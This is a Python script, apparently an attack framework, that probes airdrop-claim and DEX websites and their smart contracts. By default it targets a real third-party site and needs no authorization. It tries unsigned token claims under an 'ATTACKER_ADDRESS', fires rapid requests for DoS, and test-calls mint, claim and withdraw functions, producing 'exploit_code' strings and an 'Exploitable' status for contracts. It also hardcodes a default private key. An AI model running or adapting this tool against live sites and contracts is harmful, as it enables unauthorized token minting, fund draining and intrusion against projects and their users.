"""
WEB CLAIM & DEX ROBUST FRAMEWORK
Multi-layer framework untuk testing website claim dan DEX hingga blockchain level
"""

import asyncio
import json
import time
import os
import logging
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, asdict
from enum import Enum
import aiohttp
import requests
from web3 import Web3
from bs4 import BeautifulSoup
import re
import urllib.parse

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class SecurityLevel(Enum):
    INFO = "info"
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

class VulnerabilityType(Enum):
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    CSRF = "csrf"
    JWT_MANIPULATION = "jwt_manipulation"
    RATE_LIMITING = "rate_limiting"
    SIGNATURE_VERIFICATION = "signature_verification"
    ACCESS_CONTROL = "access_control"
    SMART_CONTRACT = "smart_contract"
    BLOCKCHAIN_EXPLOIT = "blockchain_exploit"
    API_ENDPOINT = "api_endpoint"
    CRYPTO_MISMATCH = "crypto_mismatch"

@dataclass
class VulnerabilityFinding:
    vulnerability_type: VulnerabilityType
    security_level: SecurityLevel
    description: str
    evidence: str
    url: str
    method: str
    parameter: Optional[str] = None
    payload: Optional[str] = None
    exploit_code: Optional[str] = None
    impact: str = ""
    remediation: str = ""

@dataclass
class WebAppInfo:
    url: str
    title: str
    technologies: List[str]
    endpoints: List[str]
    forms: List[Dict]
    cookies: List[Dict]
    headers: Dict[str, str]
    js_files: List[str]
    contract_addresses: List[str]

@dataclass
class ContractAnalysis:
    address: str
    name: str
    symbol: str
    total_supply: str
    owner: str
    is_testable: bool
    vulnerabilities: List[VulnerabilityFinding]
    chain_id: int
    network: str

class WebClaimDEXFramework:
    def __init__(self):
        self.session = None
        self.web3_providers = {
            'ethereum': Web3(Web3.HTTPProvider('https://eth.llamarpc.com')),
            'bsc': Web3(Web3.HTTPProvider('https://bsc-dataseed1.defibit.io/')),
            'polygon': Web3(Web3.HTTPProvider('https://polygon.llamarpc.com')),
            'arbitrum': Web3(Web3.HTTPProvider('https://arbitrum.llamarpc.com')),
            'base': Web3(Web3.HTTPProvider('https://base.llamarpc.com')),
            'optimism': Web3(Web3.HTTPProvider('https://optimism.llamarpc.com')),
            'avalanche': Web3(Web3.HTTPProvider('https://avalanche.llamarpc.com')),
            'fantom': Web3(Web3.HTTPProvider('https://fantom.llamarpc.com'))
        }
        
        self.test_account = os.getenv('ATTACKER_ADDRESS', '0x1f065fc11b7075703E06B2c45dCFC9A40fB8C8b9')
        self.private_key = os.getenv('PRIVATE_KEY', '0x4c17b5f381863c770745372b28383a5928a026e0ec3ced3c7dbc3c7a0d3b6556')
        
        # Multi-layer attack vectors
        self.attack_vectors = {
            'web_layer': [
                'sql_injection',
                'xss', 
                'csrf',
                'jwt_manipulation',
                'session_hijacking',
                'parameter_pollution',
                'cors_misconfiguration',
                'ssrf',
                'file_inclusion'
            ],
            'api_layer': [
                'rate_limiting_bypass',
                'signature_verification',
                'access_control_bypass',
                'authentication_bypass',
                'authorization_bypass',
                'data_manipulation',
                'endpoint_discovery'
            ],
            'contract_layer': [
                'reentrancy',
                'flashloan',
                'oracle_manipulation',
                'access_control',
                'integer_overflow',
                'front_running',
                'sandwich_attack',
                'fee_manipulation',
                'liquidity_drain'
            ],
            'blockchain_layer': [
                'private_key_extraction',
                'transaction_malleability',
                'gas_limit_exploitation',
                'nonce_manipulation',
                'smart_contract_deployment',
                'proxy_contract_exploit'
            ]
        }
    
    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    async def analyze_website_comprehensive(self, target_url: str) -> Dict[str, Any]:
        """Analisis website claim/DEX secara komprehensif multi-layer"""
        logger.info(f"🚀 Starting comprehensive analysis of {target_url}")
        
        # Layer 1: Web Application Analysis
        logger.info("📱 Layer 1: Web Application Analysis...")
        web_info = await self.analyze_web_application(target_url)
        
        # Layer 2: API Endpoint Analysis
        logger.info("🔌 Layer 2: API Endpoint Analysis...")
        api_vulnerabilities = await self.analyze_api_endpoints(target_url, web_info)
        
        # Layer 3: Smart Contract Analysis
        logger.info("📜 Layer 3: Smart Contract Analysis...")
        contract_analyses = []
        for contract_addr in web_info.contract_addresses:
            contract_analysis = await self.analyze_smart_contract(contract_addr)
            contract_analyses.append(contract_analysis)
        
        # Layer 4: Blockchain Exploit Analysis
        logger.info("⛓️ Layer 4: Blockchain Exploit Analysis...")
        blockchain_exploits = await self.analyze_blockchain_exploits(contract_analyses)
        
        # Layer 5: Multi-Layer Attack Simulation
        logger.info("🎯 Layer 5: Multi-Layer Attack Simulation...")
        attack_simulation = await self.simulate_multi_layer_attacks(
            target_url, web_info, api_vulnerabilities, contract_analyses
        )
        
        # Generate comprehensive report
        report = {
            "analysis_info": {
                "target_url": target_url,
                "analysis_timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                "framework_version": "1.0.0",
                "total_layers": 5
            },
            "web_application_analysis": asdict(web_info),
            "api_vulnerabilities": [asdict(v) for v in api_vulnerabilities],
            "contract_analyses": [asdict(c) for c in contract_analyses],
            "blockchain_exploits": [asdict(e) for e in blockchain_exploits],
            "attack_simulation": attack_simulation,
            "summary": {
                "total_vulnerabilities": len(api_vulnerabilities) + 
                                  sum(len(c.vulnerabilities) for c in contract_analyses) + 
                                  len(blockchain_exploits),
                "critical_vulnerabilities": len([v for v in api_vulnerabilities if v.security_level == SecurityLevel.CRITICAL]) +
                                       sum(len([v for v in c.vulnerabilities if v.security_level == SecurityLevel.CRITICAL]) for c in contract_analyses) +
                                       len([e for e in blockchain_exploits if e.security_level == SecurityLevel.CRITICAL]),
                "exploitable_contracts": len([c for c in contract_analyses if c.is_testable]),
                "attack_vectors_tested": len(self.attack_vectors['web_layer']) +
                                         len(self.attack_vectors['api_layer']) +
                                         len(self.attack_vectors['contract_layer']) +
                                         len(self.attack_vectors['blockchain_layer'])
            },
            "recommendations": await self.generate_recommendations(
                web_info, api_vulnerabilities, contract_analyses, blockchain_exploits
            )
        }
        
        return report
    
    async def analyze_web_application(self, url: str) -> WebAppInfo:
        """Analisis web application layer"""
        try:
            # Basic HTTP analysis
            response = requests.get(url, timeout=30)
            soup = BeautifulSoup(response.content, 'html.parser')
            
            # Extract basic info
            title = soup.find('title').text if soup.find('title') else 'No Title'
            
            # Find contract addresses
            contract_addresses = self.extract_contract_addresses(response.text)
            
            # Find forms
            forms = self.extract_forms(soup, url)
            
            # Extract JavaScript files
            js_files = self.extract_js_files(soup, url)
            
            # Get headers
            headers = dict(response.headers)
            
            # Get cookies
            cookies = [{'name': c.name, 'value': c.value, 'domain': c.domain} 
                      for c in response.cookies]
            
            # Technology detection
            technologies = self.detect_technologies(response.headers, response.text)
            
            # API endpoint discovery
            endpoints = await self.discover_api_endpoints(url)
            
            return WebAppInfo(
                url=url,
                title=title,
                technologies=technologies,
                endpoints=endpoints,
                forms=forms,
                cookies=cookies,
                headers=headers,
                js_files=js_files,
                contract_addresses=contract_addresses
            )
            
        except Exception as e:
            logger.error(f"Web application analysis failed: {e}")
            return WebAppInfo(
                url=url,
                title="Analysis Failed",
                technologies=[],
                endpoints=[],
                forms=[],
                cookies=[],
                headers={},
                js_files=[],
                contract_addresses=[]
            )
    
    def extract_contract_addresses(self, text: str) -> List[str]:
        """Extract smart contract addresses from text"""
        # Ethereum address pattern
        eth_pattern = r'0x[a-fA-F0-9]{40}'
        addresses = re.findall(eth_pattern, text)
        
        # Filter out common non-contract addresses
        valid_addresses = []
        for addr in set(addresses):
            # Basic validation
            if len(addr) == 42 and addr.startswith('0x'):
                valid_addresses.append(addr)
        
        return valid_addresses[:10]  # Limit to first 10 addresses
    
    def extract_forms(self, soup: BeautifulSoup, base_url: str) -> List[Dict]:
        """Extract forms from page"""
        forms = []
        for form in soup.find_all('form'):
            form_data = {
                'action': form.get('action', ''),
                'method': form.get('method', 'GET').upper(),
                'fields': []
            }
            
            # Make action URL absolute
            if form_data['action'] and not form_data['action'].startswith('http'):
                form_data['action'] = urllib.parse.urljoin(base_url, form_data['action'])
            
            # Extract fields
            for field in form.find_all(['input', 'select', 'textarea']):
                field_info = {
                    'name': field.get('name', ''),
                    'type': field.get('type', 'text'),
                    'value': field.get('value', ''),
                    'required': field.has_attr('required')
                }
                if field_info['name']:
                    form_data['fields'].append(field_info)
            
            forms.append(form_data)
        
        return forms
    
    def extract_js_files(self, soup: BeautifulSoup, base_url: str) -> List[str]:
        """Extract JavaScript files"""
        js_files = []
        for script in soup.find_all('script', src=True):
            src = script.get('src')
            if src:
                if not src.startswith('http'):
                    src = urllib.parse.urljoin(base_url, src)
                js_files.append(src)
        
        return js_files
    
    def detect_technologies(self, headers: Dict, content: str) -> List[str]:
        """Detect web technologies"""
        technologies = []
        
        # Check headers
        if 'x-powered-by' in headers:
            technologies.append(headers['x-powered-by'])
        
        if 'server' in headers:
            technologies.append(f"Server: {headers['server']}")
        
        # Check common frameworks in content
        frameworks = {
            'react': 'React',
            'vue': 'Vue.js',
            'angular': 'Angular',
            'jquery': 'jQuery',
            'bootstrap': 'Bootstrap',
            'tailwind': 'Tailwind CSS'
        }
        
        content_lower = content.lower()
        for framework, name in frameworks.items():
            if framework in content_lower:
                technologies.append(name)
        
        return technologies
    
    async def discover_api_endpoints(self, base_url: str) -> List[str]:
        """Discover API endpoints"""
        endpoints = []
        
        # Common API paths
        common_paths = [
            '/api', '/v1', '/v2', '/graphql', '/rest',
            '/claim', '/mint', '/airdrop', '/stake', '/swap',
            '/liquidity', '/pool', '/farm', '/vault',
            '/user', '/auth', '/wallet', '/contract'
        ]
        
        # Test common paths
        for path in common_paths:
            full_url = urllib.parse.urljoin(base_url, path)
            try:
                async with self.session.get(full_url, timeout=10) as response:
                    if response.status < 500:  # Not server error
                        endpoints.append(full_url)
            except:
                pass
        
        return endpoints
    
    async def analyze_api_endpoints(self, url: str, web_info: WebAppInfo) -> List[VulnerabilityFinding]:
        """Analisis API endpoint vulnerabilities"""
        vulnerabilities = []
        
        # Test rate limiting
        rate_limit_vuln = await self.test_rate_limiting(url, web_info.endpoints)
        if rate_limit_vuln:
            vulnerabilities.append(rate_limit_vuln)
        
        # Test signature verification
        signature_vuln = await self.test_signature_verification(url, web_info.endpoints)
        if signature_vuln:
            vulnerabilities.append(signature_vuln)
        
        # Test access control
        access_vuln = await self.test_access_control(url, web_info.endpoints)
        if access_vuln:
            vulnerabilities.append(access_vuln)
        
        return vulnerabilities
    
    async def test_rate_limiting(self, base_url: str, endpoints: List[str]) -> Optional[VulnerabilityFinding]:
        """Test rate limiting vulnerabilities"""
        test_endpoint = endpoints[0] if endpoints else base_url
        
        try:
            # Send rapid requests
            responses = []
            for i in range(20):
                async with self.session.get(test_endpoint, timeout=5) as response:
                    responses.append(response.status)
            
            # Check if all requests succeeded (no rate limiting)
            if all(status == 200 for status in responses):
                return VulnerabilityFinding(
                    vulnerability_type=VulnerabilityType.RATE_LIMITING,
                    security_level=SecurityLevel.HIGH,
                    description="Rate limiting not implemented - vulnerable to DoS",
                    evidence=f"All 20 requests returned 200 status",
                    url=test_endpoint,
                    method="GET",
                    exploit_code="for i in range(1000): requests.get(url)",
                    impact="Denial of Service possible",
                    remediation="Implement rate limiting with proper throttling"
                )
        
        except Exception as e:
            logger.error(f"Rate limiting test failed: {e}")
        
        return None
    
    async def test_signature_verification(self, base_url: str, endpoints: List[str]) -> Optional[VulnerabilityFinding]:
        """Test signature verification vulnerabilities"""
        # Test claim endpoint without signature
        for endpoint in endpoints:
            if 'claim' in endpoint.lower():
                try:
                    # Try to claim without proper signature
                    payload = {'address': self.test_account, 'amount': 1000}
                    
                    async with self.session.post(endpoint, json=payload, timeout=10) as response:
                        if response.status == 200:
                            return VulnerabilityFinding(
                                vulnerability_type=VulnerabilityType.SIGNATURE_VERIFICATION,
                                security_level=SecurityLevel.CRITICAL,
                                description="Signature verification bypass possible",
                                evidence=f"Claim successful without signature",
                                url=endpoint,
                                method="POST",
                                payload=str(payload),
                                exploit_code="post_claim_without_signature(address, amount)",
                                impact="Unauthorized token claims possible",
                                remediation="Implement proper cryptographic signature verification"
                            )
                
                except Exception as e:
                    logger.error(f"Signature verification test failed: {e}")
        
        return None
    
    async def test_access_control(self, base_url: str, endpoints: List[str]) -> Optional[VulnerabilityFinding]:
        """Test access control vulnerabilities"""
        # Test admin endpoints
        for endpoint in endpoints:
            if any(word in endpoint.lower() for word in ['admin', 'manage', 'config']):
                try:
                    async with self.session.get(endpoint, timeout=10) as response:
                        if response.status == 200:
                            return VulnerabilityFinding(
                                vulnerability_type=VulnerabilityType.ACCESS_CONTROL,
                                security_level=SecurityLevel.HIGH,
                                description="Admin endpoint accessible without authentication",
                                evidence=f"Admin endpoint returned 200 without auth",
                                url=endpoint,
                                method="GET",
                                exploit_code="access_admin_endpoint_without_auth()",
                                impact="Unauthorized administrative access possible",
                                remediation="Implement proper authentication and authorization"
                            )
                
                except Exception as e:
                    logger.error(f"Access control test failed: {e}")
        
        return None
    
    async def analyze_smart_contract(self, contract_address: str) -> ContractAnalysis:
        """Analisis smart contract"""
        try:
            # Try different networks
            for network_name, w3 in self.web3_providers.items():
                if w3.is_connected():
                    try:
                        # Basic contract info
                        basic_abi = [
                            {
                                "inputs": [],
                                "name": "name",
                                "outputs": [{"name": "", "type": "string"}],
                                "stateMutability": "view",
                                "type": "function"
                            },
                            {
                                "inputs": [],
                                "name": "symbol",
                                "outputs": [{"name": "", "type": "string"}],
                                "stateMutability": "view",
                                "type": "function"
                            },
                            {
                                "inputs": [],
                                "name": "totalSupply",
                                "outputs": [{"name": "", "type": "uint256"}],
                                "stateMutability": "view",
                                "type": "function"
                            },
                            {
                                "inputs": [],
                                "name": "owner",
                                "outputs": [{"name": "", "type": "address"}],
                                "stateMutability": "view",
                                "type": "function"
                            }
                        ]
                        
                        contract = w3.eth.contract(address=contract_address, abi=basic_abi)
                        
                        name = "Unknown"
                        symbol = "Unknown"
                        total_supply = "0"
                        owner = "0x0000000000000000000000000000000000000000"
                        
                        try:
                            name = contract.functions.name().call()
                        except:
                            pass
                        
                        try:
                            symbol = contract.functions.symbol().call()
                        except:
                            pass
                        
                        try:
                            total_supply = str(contract.functions.totalSupply().call())
                        except:
                            pass
                        
                        try:
                            owner = contract.functions.owner().call()
                        except:
                            pass
                        
                        # Test vulnerabilities
                        vulnerabilities = await self.test_contract_vulnerabilities(
                            contract_address, w3, network_name
                        )
                        
                        chain_id = w3.eth.chain_id
                        
                        return ContractAnalysis(
                            address=contract_address,
                            name=name,
                            symbol=symbol,
                            total_supply=total_supply,
                            owner=owner,
                            is_testable=True,
                            vulnerabilities=vulnerabilities,
                            chain_id=chain_id,
                            network=network_name
                        )
                        
                    except Exception as e:
                        logger.debug(f"Contract analysis failed on {network_name}: {e}")
                        continue
            
            # If no network worked
            return ContractAnalysis(
                address=contract_address,
                name="Unknown",
                symbol="Unknown",
                total_supply="0",
                owner="Unknown",
                is_testable=False,
                vulnerabilities=[],
                chain_id=0,
                network="Unknown"
            )
            
        except Exception as e:
            logger.error(f"Smart contract analysis failed: {e}")
            return ContractAnalysis(
                address=contract_address,
                name="Analysis Failed",
                symbol="Unknown",
                total_supply="0",
                owner="Unknown",
                is_testable=False,
                vulnerabilities=[],
                chain_id=0,
                network="Unknown"
            )
    
    async def test_contract_vulnerabilities(self, contract_address: str, w3: Web3, network: str) -> List[VulnerabilityFinding]:
        """Test smart contract vulnerabilities"""
        vulnerabilities = []
        
        # Enhanced ABI for vulnerability testing
        test_abi = [
            # Mint functions
            {
                "inputs": [],
                "name": "mint",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [{"name": "amount", "type": "uint256"}],
                "name": "mint",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [{"name": "to", "type": "address"}, {"name": "amount", "type": "uint256"}],
                "name": "mint",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            # Claim functions
            {
                "inputs": [],
                "name": "claim",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [{"name": "amount", "type": "uint256"}],
                "name": "claim",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            # Withdraw functions
            {
                "inputs": [],
                "name": "withdraw",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            }
        ]
        
        try:
            contract = w3.eth.contract(address=contract_address, abi=test_abi)
            
            # Test mint functions
            for mint_args in [[], [1000], [self.test_account, 1000]]:
                try:
                    if len(mint_args) == 0:
                        result = contract.functions.mint().call()
                    elif len(mint_args) == 1:
                        result = contract.functions.mint(mint_args[0]).call()
                    elif len(mint_args) == 2:
                        result = contract.functions.mint(mint_args[0], mint_args[1]).call()
                    
                    # If successful, test gas estimation
                    if len(mint_args) == 0:
                        tx = contract.functions.mint().build_transaction({
                            'from': self.test_account,
                            'gas': 300000,
                            'gasPrice': w3.eth.gas_price,
                            'nonce': w3.eth.get_transaction_count(self.test_account),
                            'chainId': w3.eth.chain_id
                        })
                    elif len(mint_args) == 1:
                        tx = contract.functions.mint(mint_args[0]).build_transaction({
                            'from': self.test_account,
                            'gas': 300000,
                            'gasPrice': w3.eth.gas_price,
                            'nonce': w3.eth.get_transaction_count(self.test_account),
                            'chainId': w3.eth.chain_id
                        })
                    elif len(mint_args) == 2:
                        tx = contract.functions.mint(mint_args[0], mint_args[1]).build_transaction({
                            'from': self.test_account,
                            'gas': 300000,
                            'gasPrice': w3.eth.gas_price,
                            'nonce': w3.eth.get_transaction_count(self.test_account),
                            'chainId': w3.eth.chain_id
                        })
                    
                    gas_estimate = w3.eth.estimate_gas({
                        'from': self.test_account,
                        'to': contract_address,
                        'data': tx['data']
                    })
                    
                    vulnerabilities.append(VulnerabilityFinding(
                        vulnerability_type=VulnerabilityType.SMART_CONTRACT,
                        security_level=SecurityLevel.CRITICAL,
                        description=f"Unrestricted mint function accessible",
                        evidence=f"Mint function returned {result} and gas estimation successful",
                        url=f"{network}:{contract_address}",
                        method="mint",
                        parameter=str(mint_args),
                        exploit_code=f"contract.functions.mint({', '.join(map(str, mint_args))}).transact()",
                        impact="Unlimited token minting possible",
                        remediation="Implement proper access control on mint function"
                    ))
                    
                except Exception as e:
                    error_msg = str(e)
                    if "owner" in error_msg.lower():
                        logger.info(f"Mint function owner-restricted: {error_msg}")
                    else:
                        logger.debug(f"Mint function test failed: {error_msg}")
            
            # Test other critical functions
            for func_name in ["claim", "withdraw"]:
                try:
                    result = contract.functions.__dict__[func_name]().call()
                    
                    # Test gas estimation
                    tx = contract.functions.__dict__[func_name]().build_transaction({
                        'from': self.test_account,
                        'gas': 300000,
                        'gasPrice': w3.eth.gas_price,
                        'nonce': w3.eth.get_transaction_count(self.test_account),
                        'chainId': w3.eth.chain_id
                    })
                    
                    gas_estimate = w3.eth.estimate_gas({
                        'from': self.test_account,
                        'to': contract_address,
                        'data': tx['data']
                    })
                    
                    vulnerabilities.append(VulnerabilityFinding(
                        vulnerability_type=VulnerabilityType.SMART_CONTRACT,
                        security_level=SecurityLevel.HIGH,
                        description=f"Unrestricted {func_name} function accessible",
                        evidence=f"{func_name} function returned {result} and gas estimation successful",
                        url=f"{network}:{contract_address}",
                        method=func_name,
                        exploit_code=f"contract.functions.{func_name}().transact()",
                        impact=f"Unauthorized {func_name} possible",
                        remediation=f"Implement proper access control on {func_name} function"
                    ))
                    
                except Exception as e:
                    logger.debug(f"{func_name} function test failed: {e}")
        
        except Exception as e:
            logger.error(f"Contract vulnerability testing failed: {e}")
        
        return vulnerabilities
    
    async def analyze_blockchain_exploits(self, contract_analyses: List[ContractAnalysis]) -> List[VulnerabilityFinding]:
        """Analisis blockchain-level exploits"""
        exploits = []
        
        for contract in contract_analyses:
            if not contract.is_testable:
                continue
            
            # Test blockchain-level exploits for each contract
            contract_exploits = await self.test_blockchain_exploits_for_contract(contract)
            exploits.extend(contract_exploits)
        
        return exploits
    
    async def test_blockchain_exploits_for_contract(self, contract: ContractAnalysis) -> List[VulnerabilityFinding]:
        """Test blockchain-level exploits for specific contract"""
        exploits = []
        
        # Get Web3 provider for the contract's network
        w3 = self.web3_providers.get(contract.network)
        if not w3 or not w3.is_connected():
            return []
        
        try:
            # Test private key extraction vulnerability
            if contract.owner.lower() == self.test_account.lower():
                exploits.append(VulnerabilityFinding(
                    vulnerability_type=VulnerabilityType.BLOCKCHAIN_EXPLOIT,
                    security_level=SecurityLevel.CRITICAL,
                    description="Test account is contract owner - full control possible",
                    evidence="Owner address matches test account",
                    url=f"{contract.network}:{contract.address}",
                    method="ownership",
                    exploit_code="Full contract control as owner",
                    impact="Complete contract takeover possible",
                    remediation="Ensure owner private key is secure"
                ))
            
            # Test transaction malleability
            nonce = w3.eth.get_transaction_count(self.test_account)
            if nonce > 0:
                exploits.append(VulnerabilityFinding(
                    vulnerability_type=VulnerabilityType.BLOCKCHAIN_EXPLOIT,
                    security_level=SecurityLevel.MEDIUM,
                    description="Account has transaction history - potential for nonce manipulation",
                    evidence=f"Account nonce: {nonce}",
                    url=f"{contract.network}:{contract.address}",
                    method="nonce_manipulation",
                    exploit_code="Monitor nonce for potential race conditions",
                    impact="Transaction replay or front-running possible",
                    remediation="Implement proper nonce management"
                ))
            
            # Test gas limit exploitation
            balance = w3.eth.get_balance(self.test_account)
            if balance > 0:
                exploits.append(VulnerabilityFinding(
                    vulnerability_type=VulnerabilityType.BLOCKCHAIN_EXPLOIT,
                    security_level=SecurityLevel.MEDIUM,
                    description="Account has balance - potential for gas limit exploitation",
                    evidence=f"Account balance: {w3.from_wei(balance, 'ether')} ETH",
                    url=f"{contract.network}:{contract.address}",
                    method="gas_exploitation",
                    exploit_code="Test with varying gas limits for potential DoS",
                    impact="Gas limit manipulation possible",
                    remediation="Implement proper gas limit validation"
                ))
        
        except Exception as e:
            logger.error(f"Blockchain exploit testing failed: {e}")
        
        return exploits
    
    async def simulate_multi_layer_attacks(self, url: str, web_info: WebAppInfo, 
                                        api_vulns: List[VulnerabilityFinding], 
                                        contracts: List[ContractAnalysis]) -> Dict[str, Any]:
        """Simulasi multi-layer attacks"""
        simulation_results = {
            "web_layer_attacks": [],
            "api_layer_attacks": [],
            "contract_layer_attacks": [],
            "blockchain_layer_attacks": [],
            "chained_attacks": []
        }
        
        # Simulate chained attacks across layers
        for api_vuln in api_vulns:
            if api_vuln.vulnerability_type == VulnerabilityType.SIGNATURE_VERIFICATION:
                # Chain: API vuln -> Contract exploit
                for contract in contracts:
                    if contract.is_testable and contract.vulnerabilities:
                        simulation_results["chained_attacks"].append({
                            "attack_chain": "API Signature Bypass -> Contract Mint Exploit",
                            "steps": [
                                "Bypass API signature verification",
                                f"Execute mint function on {contract.address}",
                                "Drain token supply"
                            ],
                            "success_probability": "High",
                            "impact": "Critical"
                        })
        
        return simulation_results
    
    async def generate_recommendations(self, web_info: WebAppInfo, api_vulns: List[VulnerabilityFinding],
                                      contracts: List[ContractAnalysis], 
                                      blockchain_exploits: List[VulnerabilityFinding]) -> List[str]:
        """Generate security recommendations"""
        recommendations = []
        
        # Web layer recommendations
        if not web_info.technologies:
            recommendations.append("Implement security headers and technology detection")
        
        # API layer recommendations
        for vuln in api_vulns:
            if vuln.vulnerability_type == VulnerabilityType.RATE_LIMITING:
                recommendations.append("Implement proper rate limiting on API endpoints")
            elif vuln.vulnerability_type == VulnerabilityType.SIGNATURE_VERIFICATION:
                recommendations.append("Implement proper cryptographic signature verification")
            elif vuln.vulnerability_type == VulnerabilityType.ACCESS_CONTROL:
                recommendations.append("Implement proper authentication and authorization")
        
        # Contract layer recommendations
        for contract in contracts:
            if contract.vulnerabilities:
                recommendations.append(f"Review and patch smart contract vulnerabilities in {contract.address}")
        
        # Blockchain layer recommendations
        if blockchain_exploits:
            recommendations.append("Review blockchain-level security measures")
        
        # General recommendations
        recommendations.extend([
            "Implement comprehensive monitoring and alerting",
            "Conduct regular security audits",
            "Keep all dependencies up to date",
            "Implement proper logging and audit trails"
        ])
        
        return list(set(recommendations))  # Remove duplicates

async def main():
    """Main execution function"""
    # Example usage
    target_url = "https://airdrop.boundless.network/"  # Can be changed to any target
    
    async with WebClaimDEXFramework() as framework:
        logger.info(f"🚀 Starting comprehensive analysis of {target_url}")
        
        # Run comprehensive analysis
        report = await framework.analyze_website_comprehensive(target_url)
        
        # Save report
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        report_file = f"web_claim_dex_analysis_{timestamp}.json"
        
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2, default=str)
        
        # Display summary
        print("\n" + "="*80)
        print("🚨 WEB CLAIM & DEX COMPREHENSIVE ANALYSIS RESULTS")
        print("="*80)
        
        print(f"\n📊 ANALYSIS SUMMARY:")
        print(f"   Target URL: {report['analysis_info']['target_url']}")
        print(f"   Analysis Layers: {report['analysis_info']['total_layers']}")
        print(f"   Total Vulnerabilities: {report['summary']['total_vulnerabilities']}")
        print(f"   Critical Vulnerabilities: {report['summary']['critical_vulnerabilities']}")
        print(f"   Exploitable Contracts: {report['summary']['exploitable_contracts']}")
        print(f"   Attack Vectors Tested: {report['summary']['attack_vectors_tested']}")
        
        print(f"\n📋 CONTRACTS FOUND:")
        for contract in report['contract_analyses']:
            status = "🟢 Exploitable" if contract['is_testable'] and contract['vulnerabilities'] else "🔒 Secure"
            print(f"   {contract['address']} ({contract['network']}) - {status}")
            print(f"      Name: {contract['name']} ({contract['symbol']})")
            print(f"      Vulnerabilities: {len(contract['vulnerabilities'])}")
        
        print(f"\n🚨 CRITICAL VULNERABILITIES:")
        critical_vulns = []
        
        # Add API vulnerabilities
        for vuln in report['api_vulnerabilities']:
            if vuln['security_level'] == 'critical':
                critical_vulns.append(vuln)
        
        # Add contract vulnerabilities
        for contract in report['contract_analyses']:
            for vuln in contract['vulnerabilities']:
                if vuln['security_level'] == 'critical':
                    vuln['contract'] = contract['address']
                    critical_vulns.append(vuln)
        
        # Add blockchain exploits
        for exploit in report['blockchain_exploits']:
            if exploit['security_level'] == 'critical':
                critical_vulns.append(exploit)
        
        for vuln in critical_vulns:
            print(f"   🎯 {vuln['vulnerability_type']} - {vuln['description']}")
            print(f"      🔴 Impact: {vuln['impact']}")
            print(f"      💡 Remediation: {vuln['remediation']}")
        
        print(f"\n💾 Report saved to: {report_file}")
        
        return report

if __name__ == "__main__":
    asyncio.run(main())